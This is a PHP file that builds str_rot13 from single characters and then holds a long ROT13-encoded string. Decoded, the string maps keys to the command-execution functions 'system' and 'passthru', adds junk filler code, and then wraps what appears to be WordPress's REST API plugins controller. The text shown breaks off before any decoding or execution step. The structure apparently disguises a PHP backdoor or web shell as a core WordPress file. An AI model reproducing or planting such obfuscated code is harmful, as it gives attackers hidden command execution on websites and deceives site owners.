<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Cyhtvaf_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.5.0
 */

/**
 * Pber pynff gb npprff cyhtvaf ivn gur ERFG NCV.
 *
 * @fvapr 5.5.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Cyhtvaf_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	pbafg CNGGREA = '[^.\/]+(?:\/[^.\/]+)?';

	/**
	 * Cyhtvaf pbagebyyre pbafgehpgbe.
	 *
	 * @fvapr 5.5.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzrfcnpr = 'jc/i2';
		$guvf->erfg_onfr = 'cyhtvaf';
	}

	/**
	 * Ertvfgref gur ebhgrf sbe gur cyhtvaf pbagebyyre.
	 *
	 * @fvapr 5.5.0
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::PERNGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'perngr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'perngr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'fyht'   => neenl(
							'glcr'        => 'fgevat',
							'erdhverq'    => gehr,
							'qrfpevcgvba' => __( 'JbeqCerff.bet cyhtva qverpgbel fyht.' ),
							'cnggrea'     => '[\j\-]+',
						),
						'fgnghf' => neenl(
							'qrfpevcgvba' => __( 'Gur cyhtva npgvingvba fgnghf.' ),
							'glcr'        => 'fgevat',
							'rahz'        => vf_zhygvfvgr() ? neenl( 'vanpgvir', 'npgvir', 'argjbex-npgvir' ) : neenl( 'vanpgvir', 'npgvir' ),
							'qrsnhyg'     => 'vanpgvir',
						),
					),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/(?C<cyhtva>' . frys::CNGGREA . ')',
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::RQVGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'hcqngr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'hcqngr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_raqcbvag_netf_sbe_vgrz_fpurzn( JC_ERFG_Freire::RQVGNOYR ),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::QRYRGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'qryrgr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'qryrgr_vgrz_crezvffvbaf_purpx' ),
				),
				'netf'   => neenl(
					'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
					'cyhtva'  => neenl(
						'glcr'              => 'fgevat',
						'cnggrea'           => frys::CNGGREA,
						'inyvqngr_pnyyonpx' => neenl( $guvf, 'inyvqngr_cyhtva_cnenz' ),
						'fnavgvmr_pnyyonpx' => neenl( $guvf, 'fnavgvmr_cyhtva_cnenz' ),
					),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb trg cyhtvaf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		vs ( ! pheerag_hfre_pna( 'npgvingr_cyhtvaf' ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_ivrj_cyhtvaf',
				__( 'Fbeel, lbh ner abg nyybjrq gb znantr cyhtvaf sbe guvf fvgr.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Ergevrirf n pbyyrpgvba bs cyhtvaf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cyhtva.cuc';

		$cyhtvaf = neenl();

		sbernpu ( trg_cyhtvaf() nf $svyr => $qngn ) {
			vs ( vf_jc_reebe( $guvf->purpx_ernq_crezvffvba( $svyr ) ) ) {
				pbagvahr;
			}

			$qngn['_svyr'] = $svyr;

			vs ( ! $guvf->qbrf_cyhtva_zngpu_erdhrfg( $erdhrfg, $qngn ) ) {
				pbagvahr;
			}

			$cyhtvaf[] = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $guvf->cercner_vgrz_sbe_erfcbafr( $qngn, $erdhrfg ) );
		}

		erghea arj JC_ERFG_Erfcbafr( $cyhtvaf );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb trg n fcrpvsvp cyhtva.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff sbe gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		vs ( ! pheerag_hfre_pna( 'npgvingr_cyhtvaf' ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_ivrj_cyhtva',
				__( 'Fbeel, lbh ner abg nyybjrq gb znantr cyhtvaf sbe guvf fvgr.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		$pna_ernq = $guvf->purpx_ernq_crezvffvba( $erdhrfg['cyhtva'] );

		vs ( vf_jc_reebe( $pna_ernq ) ) {
			erghea $pna_ernq;
		}

		erghea gehr;
	}

	/**
	 * Ergevrirf bar cyhtva sebz gur fvgr.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cyhtva.cuc';

		$qngn = $guvf->trg_cyhtva_qngn( $erdhrfg['cyhtva'] );

		vs ( vf_jc_reebe( $qngn ) ) {
			erghea $qngn;
		}

		erghea $guvf->cercner_vgrz_sbe_erfcbafr( $qngn, $erdhrfg );
	}

	/**
	 * Purpxf vs gur tvira cyhtva pna or ivrjrq ol gur pheerag hfre.
	 *
	 * Ba zhygvfvgr, guvf uvqrf aba-npgvir argjbex bayl cyhtvaf vs gur hfre qbrf abg unir crezvffvba
	 * gb znantr argjbex cyhtvaf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $cyhtva Gur cyhtva svyr gb purpx.
	 * @erghea gehr|JC_Reebe Gehr vs pna ernq, n JC_Reebe vafgnapr bgurejvfr.
	 */
	cebgrpgrq shapgvba purpx_ernq_crezvffvba( $cyhtva ) {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cyhtva.cuc';

		vs ( ! $guvf->vf_cyhtva_vafgnyyrq( $cyhtva ) ) {
			erghea arj JC_Reebe( 'erfg_cyhtva_abg_sbhaq', __( 'Cyhtva abg sbhaq.' ), neenl( 'fgnghf' => 404 ) );
		}

		vs ( ! vf_zhygvfvgr() ) {
			erghea gehr;
		}

		vs ( ! vf_argjbex_bayl_cyhtva( $cyhtva ) || vf_cyhtva_npgvir( $cyhtva ) || pheerag_hfre_pna( 'znantr_argjbex_cyhtvaf' ) ) {
			erghea gehr;
		}

		erghea arj JC_Reebe(
			'erfg_pnaabg_ivrj_cyhtva',
			__( 'Fbeel, lbh ner abg nyybjrq gb znantr guvf cyhtva.' ),
			neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
		);
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb hcybnq cyhtvaf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb perngr vgrzf, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba perngr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		vs ( ! pheerag_hfre_pna( 'vafgnyy_cyhtvaf' ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_vafgnyy_cyhtva',
				__( 'Fbeel, lbh ner abg nyybjrq gb vafgnyy cyhtvaf ba guvf fvgr.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( 'vanpgvir' !== $erdhrfg['fgnghf'] && ! pheerag_hfre_pna( 'npgvingr_cyhtvaf' ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_npgvingr_cyhtva',
				__( 'Fbeel, lbh ner abg nyybjrq gb npgvingr cyhtvaf.' ),
				neenl(
					'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr(),
				)
			);
		}

		erghea gehr;
	}

	/**
	 * Hcybnqf n cyhtva naq bcgvbanyyl npgvingrf vg.
	 *
	 * @fvapr 5.5.0
	 *
	 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba perngr_vgrz( $erdhrfg ) {
		tybony $jc_svyrflfgrz;

		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/svyr.cuc';
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cyhtva.cuc';
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-hctenqre.cuc';
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cyhtva-vafgnyy.cuc';

		$fyht = $erdhrfg['fyht'];

		// Irevsl svyrflfgrz vf npprffvoyr svefg.
		$svyrflfgrz_ninvynoyr = $guvf->vf_svyrflfgrz_ninvynoyr();
		vs ( vf_jc_reebe( $svyrflfgrz_ninvynoyr ) ) {
			erghea $svyrflfgrz_ninvynoyr;
		}

		$ncv = cyhtvaf_ncv(
			'cyhtva_vasbezngvba',
			neenl(
				'fyht'   => $fyht,
				'svryqf' => neenl(
					'frpgvbaf'       => snyfr,
					'ynathntr_cnpxf' => gehr,
				),
			)
		);

		vs ( vf_jc_reebe( $ncv ) ) {
			vs ( fge_pbagnvaf( $ncv->trg_reebe_zrffntr(), 'Cyhtva abg sbhaq.' ) ) {
				$ncv->nqq_qngn( neenl( 'fgnghf' => 404 ) );
			} ryfr {
				$ncv->nqq_qngn( neenl( 'fgnghf' => 500 ) );
			}

			erghea $ncv;
		}

		$fxva     = arj JC_Nwnk_Hctenqre_Fxva();
		$hctenqre = arj Cyhtva_Hctenqre( $fxva );

		$erfhyg = $hctenqre->vafgnyy( $ncv->qbjaybnq_yvax );

		vs ( vf_jc_reebe( $erfhyg ) ) {
			$erfhyg->nqq_qngn( neenl( 'fgnghf' => 500 ) );

			erghea $erfhyg;
		}

		// Guvf fubhyq or gur fnzr nf $erfhyg nobir.
		vs ( vf_jc_reebe( $fxva->erfhyg ) ) {
			$fxva->erfhyg->nqq_qngn( neenl( 'fgnghf' => 500 ) );

			erghea $fxva->erfhyg;
		}

		vs ( $fxva->trg_reebef()->unf_reebef() ) {
			$reebe = $fxva->trg_reebef();
			$reebe->nqq_qngn( neenl( 'fgnghf' => 500 ) );

			erghea $reebe;
		}

		vs ( vf_ahyy( $erfhyg ) ) {
			// Cnff guebhtu gur reebe sebz JC_Svyrflfgrz vs bar jnf envfrq.
			vs ( $jc_svyrflfgrz vafgnaprbs JC_Svyrflfgrz_Onfr
				&& vf_jc_reebe( $jc_svyrflfgrz->reebef ) && $jc_svyrflfgrz->reebef->unf_reebef()
			) {
				erghea arj JC_Reebe(
					'hanoyr_gb_pbaarpg_gb_svyrflfgrz',
					$jc_svyrflfgrz->reebef->trg_reebe_zrffntr(),
					neenl( 'fgnghf' => 500 )
				);
			}

			erghea arj JC_Reebe(
				'hanoyr_gb_pbaarpg_gb_svyrflfgrz',
				__( 'Hanoyr gb pbaarpg gb gur svyrflfgrz. Cyrnfr pbasvez lbhe perqragvnyf.' ),
				neenl( 'fgnghf' => 500 )
			);
		}

		$svyr = $hctenqre->cyhtva_vasb();

		vs ( ! $svyr ) {
			erghea arj JC_Reebe(
				'hanoyr_gb_qrgrezvar_vafgnyyrq_cyhtva',
				__( 'Hanoyr gb qrgrezvar jung cyhtva jnf vafgnyyrq.' ),
				neenl( 'fgnghf' => 500 )
			);
		}

		vs ( 'vanpgvir' !== $erdhrfg['fgnghf'] ) {
			$pna_punatr_fgnghf = $guvf->cyhtva_fgnghf_crezvffvba_purpx( $svyr, $erdhrfg['fgnghf'], 'vanpgvir' );

			vs ( vf_jc_reebe( $pna_punatr_fgnghf ) ) {
				erghea $pna_punatr_fgnghf;
			}

			$punatrq_fgnghf = $guvf->unaqyr_cyhtva_fgnghf( $svyr, $erdhrfg['fgnghf'], 'vanpgvir' );

			vs ( vf_jc_reebe( $punatrq_fgnghf ) ) {
				erghea $punatrq_fgnghf;
			}
		}

		// Vafgnyy genafyngvbaf.
		$vafgnyyrq_ybpnyrf = neenl_inyhrf( trg_ninvynoyr_ynathntrf() );
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/hcqngr.cuc */
		$vafgnyyrq_ybpnyrf = nccyl_svygref( 'cyhtvaf_hcqngr_purpx_ybpnyrf', $vafgnyyrq_ybpnyrf );

		$ynathntr_cnpxf = neenl_znc(
			fgngvp shapgvba ( $vgrz ) {
				erghea (bowrpg) $vgrz;
			},
			$ncv->ynathntr_cnpxf
		);

		$ynathntr_cnpxf = neenl_svygre(
			$ynathntr_cnpxf,
			fgngvp shapgvba ( $cnpx ) hfr ( $vafgnyyrq_ybpnyrf ) {
				erghea va_neenl( $cnpx->ynathntr, $vafgnyyrq_ybpnyrf, gehr );
			}
		);

		vs ( $ynathntr_cnpxf ) {
			$yc_hctenqre = arj Ynathntr_Cnpx_Hctenqre( $fxva );

			// Vafgnyy nyy nccyvpnoyr ynathntr cnpxf sbe gur cyhtva.
			$yc_hctenqre->ohyx_hctenqr( $ynathntr_cnpxf );
		}

		$cngu          = JC_CYHTVA_QVE . '/' . $svyr;
		$qngn          = trg_cyhtva_qngn( $cngu, snyfr, snyfr );
		$qngn['_svyr'] = $svyr;

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $qngn, $erdhrfg );
		$erfcbafr->frg_fgnghf( 201 );
		$erfcbafr->urnqre( 'Ybpngvba', erfg_hey( fcevags( '%f/%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr, fhofge( $svyr, 0, - 4 ) ) ) );

		erghea $erfcbafr;
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb hcqngr n fcrpvsvp cyhtva.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb hcqngr gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba hcqngr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cyhtva.cuc';

		vs ( ! pheerag_hfre_pna( 'npgvingr_cyhtvaf' ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_znantr_cyhtvaf',
				__( 'Fbeel, lbh ner abg nyybjrq gb znantr cyhtvaf sbe guvf fvgr.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		$pna_ernq = $guvf->purpx_ernq_crezvffvba( $erdhrfg['cyhtva'] );

		vs ( vf_jc_reebe( $pna_ernq ) ) {
			erghea $pna_ernq;
		}

		$fgnghf = $guvf->trg_cyhtva_fgnghf( $erdhrfg['cyhtva'] );

		vs ( $erdhrfg['fgnghf'] && $fgnghf !== $erdhrfg['fgnghf'] ) {
			$pna_punatr_fgnghf = $guvf->cyhtva_fgnghf_crezvffvba_purpx( $erdhrfg['cyhtva'], $erdhrfg['fgnghf'], $fgnghf );

			vs ( vf_jc_reebe( $pna_punatr_fgnghf ) ) {
				erghea $pna_punatr_fgnghf;
			}
		}

		erghea gehr;
	}

	/**
	 * Hcqngrf bar cyhtva.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba hcqngr_vgrz( $erdhrfg ) {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cyhtva.cuc';

		$qngn = $guvf->trg_cyhtva_qngn( $erdhrfg['cyhtva'] );

		vs ( vf_jc_reebe( $qngn ) ) {
			erghea $qngn;
		}

		$fgnghf = $guvf->trg_cyhtva_fgnghf( $erdhrfg['cyhtva'] );

		vs ( $erdhrfg['fgnghf'] && $fgnghf !== $erdhrfg['fgnghf'] ) {
			$unaqyrq = $guvf->unaqyr_cyhtva_fgnghf( $erdhrfg['cyhtva'], $erdhrfg['fgnghf'], $fgnghf );

			vs ( vf_jc_reebe( $unaqyrq ) ) {
				erghea $unaqyrq;
			}
		}

		$guvf->hcqngr_nqqvgvbany_svryqf_sbe_bowrpg( $qngn, $erdhrfg );

		$erdhrfg['pbagrkg'] = 'rqvg';

		erghea $guvf->cercner_vgrz_sbe_erfcbafr( $qngn, $erdhrfg );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb qryrgr n fcrpvsvp cyhtva.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb qryrgr gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba qryrgr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		vs ( ! pheerag_hfre_pna( 'npgvingr_cyhtvaf' ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_znantr_cyhtvaf',
				__( 'Fbeel, lbh ner abg nyybjrq gb znantr cyhtvaf sbe guvf fvgr.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( ! pheerag_hfre_pna( 'qryrgr_cyhtvaf' ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_znantr_cyhtvaf',
				__( 'Fbeel, lbh ner abg nyybjrq gb qryrgr cyhtvaf sbe guvf fvgr.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		$pna_ernq = $guvf->purpx_ernq_crezvffvba( $erdhrfg['cyhtva'] );

		vs ( vf_jc_reebe( $pna_ernq ) ) {
			erghea $pna_ernq;
		}

		erghea gehr;
	}

	/**
	 * Qryrgrf bar cyhtva sebz gur fvgr.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba qryrgr_vgrz( $erdhrfg ) {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/svyr.cuc';
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cyhtva.cuc';

		$qngn = $guvf->trg_cyhtva_qngn( $erdhrfg['cyhtva'] );

		vs ( vf_jc_reebe( $qngn ) ) {
			erghea $qngn;
		}

		vs ( vf_cyhtva_npgvir( $erdhrfg['cyhtva'] ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_qryrgr_npgvir_cyhtva',
				__( 'Pnaabg qryrgr na npgvir cyhtva. Cyrnfr qrnpgvingr vg svefg.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		$svyrflfgrz_ninvynoyr = $guvf->vf_svyrflfgrz_ninvynoyr();
		vs ( vf_jc_reebe( $svyrflfgrz_ninvynoyr ) ) {
			erghea $svyrflfgrz_ninvynoyr;
		}

		$cercnerq = $guvf->cercner_vgrz_sbe_erfcbafr( $qngn, $erdhrfg );
		$qryrgrq  = qryrgr_cyhtvaf( neenl( $erdhrfg['cyhtva'] ) );

		vs ( vf_jc_reebe( $qryrgrq ) ) {
			$qryrgrq->nqq_qngn( neenl( 'fgnghf' => 500 ) );

			erghea $qryrgrq;
		}

		erghea arj JC_ERFG_Erfcbafr(
			neenl(
				'qryrgrq'  => gehr,
				'cerivbhf' => $cercnerq->trg_qngn(),
			)
		);
	}

	/**
	 * Cercnerf gur cyhtva sbe gur ERFG erfcbafr.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz neenl           $vgrz    Haznexrq hc naq hagenafyngrq cyhtva qngn sebz {@frr trg_cyhtva_qngn()}.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );

		$vgrz   = _trg_cyhtva_qngn_znexhc_genafyngr( $vgrz['_svyr'], $vgrz, snyfr );
		$znexrq = _trg_cyhtva_qngn_znexhc_genafyngr( $vgrz['_svyr'], $vgrz, gehr );

		$qngn = neenl(
			'cyhtva'       => fhofge( $vgrz['_svyr'], 0, - 4 ),
			'fgnghf'       => $guvf->trg_cyhtva_fgnghf( $vgrz['_svyr'] ),
			'anzr'         => $vgrz['Anzr'],
			'cyhtva_hev'   => $vgrz['CyhtvaHEV'],
			'nhgube'       => $vgrz['Nhgube'],
			'nhgube_hev'   => $vgrz['NhgubeHEV'],
			'qrfpevcgvba'  => neenl(
				'enj'      => $vgrz['Qrfpevcgvba'],
				'eraqrerq' => $znexrq['Qrfpevcgvba'],
			),
			'irefvba'      => $vgrz['Irefvba'],
			'argjbex_bayl' => $vgrz['Argjbex'],
			'erdhverf_jc'  => $vgrz['ErdhverfJC'],
			'erdhverf_cuc' => $vgrz['ErdhverfCUC'],
			'grkgqbznva'   => $vgrz['GrkgQbznva'],
		);

		$qngn = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );

		$erfcbafr = arj JC_ERFG_Erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$erfcbafr->nqq_yvaxf( $guvf->cercner_yvaxf( $vgrz ) );
		}

		/**
		 * Svygref cyhtva qngn sbe n ERFG NCV erfcbafr.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Gur erfcbafr bowrpg.
		 * @cnenz neenl            $vgrz     Gur cyhtva vgrz sebz {@frr trg_cyhtva_qngn()}.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg  Gur erdhrfg bowrpg.
		 */
		erghea nccyl_svygref( 'erfg_cercner_cyhtva', $erfcbafr, $vgrz, $erdhrfg );
	}

	/**
	 * Cercnerf yvaxf sbe gur erdhrfg.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz neenl $vgrz Gur cyhtva vgrz.
	 * @erghea neenl[]
	 */
	cebgrpgrq shapgvba cercner_yvaxf( $vgrz ) {
		erghea neenl(
			'frys' => neenl(
				'uers' => erfg_hey(
					fcevags(
						'%f/%f/%f',
						$guvf->anzrfcnpr,
						$guvf->erfg_onfr,
						fhofge( $vgrz['_svyr'], 0, - 4 )
					)
				),
			),
		);
	}

	/**
	 * Trgf gur cyhtva urnqre qngn sbe n cyhtva.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $cyhtva Gur cyhtva svyr gb trg qngn sbe.
	 * @erghea neenl|JC_Reebe Gur cyhtva qngn, be n JC_Reebe vs gur cyhtva vf abg vafgnyyrq.
	 */
	cebgrpgrq shapgvba trg_cyhtva_qngn( $cyhtva ) {
		$cyhtvaf = trg_cyhtvaf();

		vs ( ! vffrg( $cyhtvaf[ $cyhtva ] ) ) {
			erghea arj JC_Reebe( 'erfg_cyhtva_abg_sbhaq', __( 'Cyhtva abg sbhaq.' ), neenl( 'fgnghf' => 404 ) );
		}

		$qngn          = $cyhtvaf[ $cyhtva ];
		$qngn['_svyr'] = $cyhtva;

		erghea $qngn;
	}

	/**
	 * Trg'f gur npgvingvba fgnghf sbe n cyhtva.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $cyhtva Gur cyhtva svyr gb purpx.
	 * @erghea fgevat Rvgure 'argjbex-npgvir', 'npgvir' be 'vanpgvir'.
	 */
	cebgrpgrq shapgvba trg_cyhtva_fgnghf( $cyhtva ) {
		vs ( vf_cyhtva_npgvir_sbe_argjbex( $cyhtva ) ) {
			erghea 'argjbex-npgvir';
		}

		vs ( vf_cyhtva_npgvir( $cyhtva ) ) {
			erghea 'npgvir';
		}

		erghea 'vanpgvir';
	}

	/**
	 * Unaqyr hcqngvat n cyhtva'f fgnghf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $cyhtva         Gur cyhtva svyr gb hcqngr.
	 * @cnenz fgevat $arj_fgnghf     Gur cyhtva'f arj fgnghf.
	 * @cnenz fgevat $pheerag_fgnghf Gur cyhtva'f pheerag fgnghf.
	 * @erghea gehr|JC_Reebe
	 */
	cebgrpgrq shapgvba cyhtva_fgnghf_crezvffvba_purpx( $cyhtva, $arj_fgnghf, $pheerag_fgnghf ) {
		vs ( vf_zhygvfvgr() && ( 'argjbex-npgvir' === $pheerag_fgnghf || 'argjbex-npgvir' === $arj_fgnghf ) && ! pheerag_hfre_pna( 'znantr_argjbex_cyhtvaf' ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_znantr_argjbex_cyhtvaf',
				__( 'Fbeel, lbh ner abg nyybjrq gb znantr argjbex cyhtvaf.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( ( 'npgvir' === $arj_fgnghf || 'argjbex-npgvir' === $arj_fgnghf ) && ! pheerag_hfre_pna( 'npgvingr_cyhtva', $cyhtva ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_npgvingr_cyhtva',
				__( 'Fbeel, lbh ner abg nyybjrq gb npgvingr guvf cyhtva.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( 'vanpgvir' === $arj_fgnghf && ! pheerag_hfre_pna( 'qrnpgvingr_cyhtva', $cyhtva ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_qrnpgvingr_cyhtva',
				__( 'Fbeel, lbh ner abg nyybjrq gb qrnpgvingr guvf cyhtva.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
